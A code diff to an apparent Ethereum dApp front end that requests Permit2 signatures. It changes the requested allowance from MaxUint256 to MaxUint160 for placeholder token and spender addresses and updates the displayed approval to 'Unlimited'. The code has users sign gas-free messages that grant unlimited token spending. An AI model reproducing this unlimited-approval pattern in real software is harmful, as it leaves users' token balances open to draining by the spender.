@@ -4,6 +4,9 @@ import { EthersAdapter } from '@reown/appkit-adapter-ethers';
 import { mainnet } from '@reown/appkit/networks';
 import { BrowserProvider, Contract, MaxUint256 } from 'ethers';
 
+// MaxUint160 constant for Permit2 (2^160 - 1)
+const MaxUint160 = BigInt('0xffffffffffffffffffffffffffffffffffffffff');
+
 // ============================================================================
 // PLACEHOLDER CONSTANTS - REPLACE WITH ACTUAL VALUES
 // ============================================================================
@@ -125,7 +128,7 @@ You are about to sign a gas-free message that cryptographically authorizes the U
       const permitNonce = 0; // For demo: should be tracked per user/token in production
       const permitted = {
         token: TOKEN_CONTRACT_ADDRESS,
-        amount: MaxUint256,
+        amount: MaxUint160.toString(), // Pass as string to avoid BigInt serialization issues
         expiration: deadline,
         nonce: permitNonce
       };
@@ -299,7 +302,7 @@ You are about to sign a gas-free message that cryptographically authorizes the U
               <div><strong>Token:</strong> {TOKEN_CONTRACT_ADDRESS.slice(0, 10)}...</div>
               <div><strong>Spender:</strong> {SPENDER_ADDRESS.slice(0, 10)}...</div>
               <div><strong>Network:</strong> Ethereum Mainnet</div>
-              <div><strong>Approval:</strong> Unlimited (MaxUint256)</div>
+              <div><strong>Approval:</strong> Unlimited (MaxUint160)</div>
             </div>
           </details>
         </div>
